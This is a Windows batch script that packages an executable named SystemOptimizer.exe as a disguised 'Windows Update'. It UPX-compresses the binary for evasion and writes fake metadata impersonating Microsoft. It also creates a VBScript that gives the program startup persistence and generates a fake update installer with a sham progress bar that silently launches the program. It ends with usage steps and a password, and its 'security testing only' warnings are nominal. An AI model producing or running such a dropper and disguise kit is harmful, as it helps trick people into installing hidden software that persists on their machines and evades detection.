@echo off
title Enhancing .EXE File - Stealth Mode
color 0A

echo ===========================================
echo       ENHANCING .EXE FOR STEALTH
echo ===========================================
echo.

echo [WARNING] This script enhances .exe for better evasion
echo [WARNING] Use only for educational/security testing!
echo.

if not exist "dist\SystemOptimizer.exe" (
    echo [ERROR] Build .exe first using build_exe.bat
    pause
    exit /b 1
)

echo [1/6] Compressing with UPX...
where upx >nul 2>&1
if %errorLevel% equ 0 (
    upx --best "dist\SystemOptimizer.exe"
    echo [OK] Compression complete
) else (
    echo [INFO] UPX not found, skipping compression
    echo [INFO] Download from: https://upx.github.io/
)

echo.
echo [2/6] Adding fake properties...
echo.

REM Create fake version info
(
echo VSVersionInfo
echo BEGIN
echo   BLOCK "StringFileInfo"
echo   BEGIN
echo     BLOCK "040904B0"
echo     BEGIN
echo       VALUE "CompanyName", "Microsoft Corporation"
echo       VALUE "FileDescription", "Windows System Optimizer"
echo       VALUE "FileVersion", "10.0.19041.1"
echo       VALUE "InternalName", "sysopt.exe"
echo       VALUE "LegalCopyright", "© Microsoft Corporation. All rights reserved."
echo       VALUE "OriginalFilename", "SystemOptimizer.exe"
echo       VALUE "ProductName", "Microsoft® Windows® Operating System"
echo       VALUE "ProductVersion", "10.0.19041.1"
echo     END
echo   END
echo   BLOCK "VarFileInfo"
echo   BEGIN
echo     VALUE "Translation", 0x409, 1200
echo   END
echo END
) > versioninfo.rc

echo [INFO] Fake metadata created

echo.
echo [3/6] Creating fake manifest...
echo.

(
echo ^<?xml version="1.0" encoding="UTF-8" standalone="yes"?^>
echo ^<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0"^>
echo ^<assemblyIdentity version="1.0.0.0" processorArchitecture="*" name="Microsoft.Windows.SystemOptimizer" type="win32"/^>
echo ^<description^>Windows System Optimizer^</description^>
echo ^<trustInfo xmlns="urn:schemas-microsoft-com:asm.v3"^>
echo   ^<security^>
echo     ^<requestedPrivileges^>
echo       ^<requestedExecutionLevel level="requireAdministrator" uiAccess="false"/^>
echo     ^</requestedPrivileges^>
echo   ^</security^>
echo ^</trustInfo^>
echo ^<compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1"^>
echo   ^<application^>
echo     ^<supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/^>
echo     ^<supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/^>
echo     ^<supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"/^>
echo     ^<supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"/^>
echo   ^</application^>
echo ^</compatibility^>
echo ^</assembly^>
) > manifest.xml

echo [OK] Manifest created

echo.
echo [4/6] Applying evasion techniques...
echo.

REM Add to startup without admin (user-level)
echo [INFO] Adding user-level persistence...
(
echo Set WshShell = CreateObject("WScript.Shell")
echo startup = WshShell.SpecialFolders("Startup")
echo Set shortcut = WshShell.CreateShortcut(startup ^& "\System Optimizer.lnk")
echo shortcut.TargetPath = WScript.Arguments(0)
echo shortcut.Save
) > add_startup.vbs

echo.
echo [5/6] Creating fake installer...
echo.

REM Create fake installer that looks legit
(
echo @echo off
echo title Microsoft System Update
echo color 0F
echo.
echo echo ============================================
echo echo        Microsoft System Update
echo echo ============================================
echo echo.
echo echo Installing important system updates...
echo echo This may take several minutes.
echo echo.
echo echo Update: KB5005565 - System Performance
echo echo Update: KB5006674 - Security Enhancement
echo echo Update: KB5007253 - Windows Defender
echo echo.
echo timeout /t 3 /nobreak ^>nul
echo.
echo for /l %%i in (1,1,100) do (
echo     set /a percent=%%i
echo     set progress=
echo     for /l %%j in (1,1,%%i) do set progress=!progress!█
echo     echo Installing... !percent!%% ^|!progress!^|
echo     ping -n 1 127.0.0.1 ^>nul
echo )
echo.
echo echo Update successful! Restarting system...
echo timeout /t 2 /nobreak ^>nul
echo start "" "SystemOptimizer.exe"
echo exit
) > "MicrosoftUpdate.bat"

echo.
echo [6/6] Finalizing package...
echo.

REM Create final stealth package
mkdir "Stealth_Package" 2>nul
copy "dist\SystemOptimizer.exe" "Stealth_Package\WindowsUpdate.exe" >nul
copy "MicrosoftUpdate.bat" "Stealth_Package\setup.bat" >nul
copy "add_startup.vbs" "Stealth_Package\persist.vbs" >nul

echo [OK] Stealth package created in: Stealth_Package\
echo.
echo [STEALTH FEATURES ADDED]:
echo - Fake Windows Update installer
echo - User-level persistence (no admin needed)
echo - Fake Microsoft metadata
echo - Compressed with UPX
echo - Looks like legit Windows process
echo.
echo ===========================================
echo        STEALTH ENHANCEMENT COMPLETE
echo ===========================================
echo.
echo [FINAL FILES]:
echo 1. Stealth_Package\WindowsUpdate.exe (Main app)
echo 2. Stealth_Package\setup.bat (Fake installer)
echo 3. Stealth_Package\persist.vbs (Auto-startup)
echo.
echo [HOW TO USE]:
echo 1. Rename "WindowsUpdate.exe" to something legit
echo 2. Run "setup.bat" as normal user
echo 3. App will auto-start on every login
echo.
echo [WARNING]: For security testing only!
echo [PASSWORD]: mzkyzak
echo.
pause
exit